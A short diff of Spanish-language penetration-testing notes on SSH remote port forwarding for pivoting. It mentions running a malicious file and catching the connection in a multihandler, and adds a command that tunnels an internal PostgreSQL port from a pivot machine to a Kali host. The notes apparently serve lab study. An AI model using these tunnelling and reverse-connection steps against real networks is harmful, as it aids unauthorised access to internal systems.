@@ -12,3 +12,9 @@ ssh -R <IP_subred_no_alcanzable>:<puerto_donde_se_genera_la_conección>:0.0.0.0:
 
 Podemos forwardear más de un puerto
 ejecutamos el archivo malicioso y esperamos la conección en el multihandler.
+
+
+
+Podemos hacerlo también desde la máquina pivot
+
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
